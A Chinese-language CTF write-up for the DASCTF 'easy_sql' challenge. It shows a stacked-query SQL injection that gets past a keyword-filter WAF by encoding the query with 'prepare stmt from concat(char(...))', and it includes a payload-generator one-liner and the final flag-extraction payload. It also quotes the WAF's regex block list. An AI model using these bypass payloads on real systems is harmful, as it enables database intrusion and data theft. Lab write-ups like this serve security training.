🎯 题目概览

DASCTF 的 easy_sql 靶场，基于真实环境渗透场景。PHP 7.3.10 + MariaDB 10.3.18，提示"sqlmap是没有灵魂的"——暗示需要手动注入。

<h1>取材于某次真实环境渗透，只说一句话：开发和安全缺一不可</h1>
<!-- sqlmap是没有灵魂的 -->
<form method="get">
    姿势: <input type="text" name="inject" value="1">
    <input type="submit">
</form>

一个GET参数 inject，默认值 1，输出在 <pre> 标签中以 var_dump 形式显示。

🔍 信息收集与注入点确认

基础测试

输入 1 返回查询结果（数组），输入 1' 报 SQL 语法错误：

# 正常查询 → 返回 var_dump 结果
inject=1  → array(2) { [0]=> string(1) "1" [1]=> string(7) "hahahah" }

# 单引号触发SQL错误 → 确认字符串型注入
inject=1' → error 1064 : ...near ''1''' at line 1

# 布尔盲注验证
inject=1' and '1'='1  → 有数据（True）
inject=1' and '1'='2  → 无数据（False）

确认为单引号字符串型注入，MariaDB 数据库。

🛡️ WAF分析：双重防护

第一层：preg_match 关键字过滤

当输入包含 select 时，返回了源码泄露：

# 输入 union select 1 → 返回：
return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);

过滤的关键字：

关键字用途影响
select查询数据无法直接查询
update更新数据无法更新
delete删除数据无法删除
drop删除表无法删表
insert插入数据无法插入
where条件过滤无法使用WHERE子句
.点号（information_schema.tables）无法直接引用跨库表

注意：正则使用 /i 标志，大小写不敏感，无法用大小写绕过。

第二层：strstr 组合过滤

当同时包含 set 和 prepare 时：

# 输入 set @a=1;prepare... → 返回：
strstr($inject, "set") && strstr($inject, "prepare")

这层防护直接封杀了经典的 SET @sql=...; PREPARE stmt FROM @sql; EXECUTE stmt; 绕过方式。

💡 两层WAF配合：第一层过滤SQL关键字，第二层封杀预编译绕过。需要找到一个既能避开关键字过滤、又不同时使用set+prepare的方法。

🔧 绕过思路：prepare from concat(char())

关键发现

测试发现 prepare 和 execute 本身并不在过滤列表中！只有同时出现 set+prepare 才会被拦截。

MySQL的 PREPARE 语句支持直接从表达式准备：

-- 经典方式（被拦截）：
SET @sql = concat('sel','ect version()');
PREPARE stmt FROM @sql;
EXECUTE stmt;

-- 绕过方式（可行）：
PREPARE stmt FROM concat(char(115,101,108,101,99,116,32,118,101,114,115,105,111,110,40,41));
EXECUTE stmt;
-- 等价于：PREPARE stmt FROM 'select version()'

绕过原理

  1. 不用 set — PREPARE stmt FROM expr 直接接收表达式，不需要先赋值给变量
  2. 用 char() 编码 — 将整个SQL语句编码为ASCII数字，完全避开 select/where/. 等关键字
  3. 用 concat() 拼接 — 将多个 char() 段拼接成完整的SQL字符串

Payload构造工具

python3 -c "
sql = 'select version()'
chars = ','.join(str(ord(c)) for c in sql)
print('1\\';prepare stmt from concat(char(' + chars + '));execute stmt;%23')
"

输出：

1';prepare stmt from concat(char(115,101,108,101,99,116,32,118,101,114,115,105,111,110,40,41));execute stmt;%23

整个payload中不包含任何被过滤的关键字和字符，WAF完全放行。

Step 1：版本和数据库

# 数据库 → supersqli

Step 2：表名枚举

# show tables

Step 3：列名查询

# 查询 1919810931114514 表的列名

# 结果：flag

表名以数字开头，直接使用会报语法错误，需要用反引号包裹。

Step 4：提取Flag

# select flag from `1919810931114514`
# 反引号 ` = char(96)

# 最终payload：
1';prepare stmt from concat(char(
  115,101,108,101,99,116,32,          -- "select "
  102,108,97,103,32,                  -- "flag "
  102,114,111,109,32,                 -- "from "
  96,                                 -- "`"
  49,57,49,57,56,49,48,57,51,49,49,49,52,53,49,52,  -- "1919810931114514"
  96                                  -- "`"
));execute stmt;%23

📊 总结

攻击链

单引号注入确认 → WAF分析（两层过滤）
  → 发现 prepare/execute 未被单独过滤
  → prepare from concat(char(...)) 绕过关键字过滤
  → 只用 prepare 不用 set，绕过组合过滤
  → show tables → 信息收集
  → information_schema.columns → 列名获取
  → select flag from `数字表名`（反引号绕过）→ Flag

关键技巧

技巧说明
char() 编码将SQL关键字编码为ASCII数字，完全绕过正则匹配
PREPARE FROM exprMySQL支持直接从表达式准备语句，无需SET变量
反引号包裹表名数字开头的表名需要用反引号 ` 转义
WAF源码泄露过滤触发时返回PHP源码，直接暴露防护逻辑

💡 这道题的核心在于"开发和安全缺一不可"——WAF设计有两层防护，但 PREPARE FROM expr 这个语法特性绕过了所有过滤。安全开发不能只过滤关键字，还需要考虑SQL语法的多种写法。
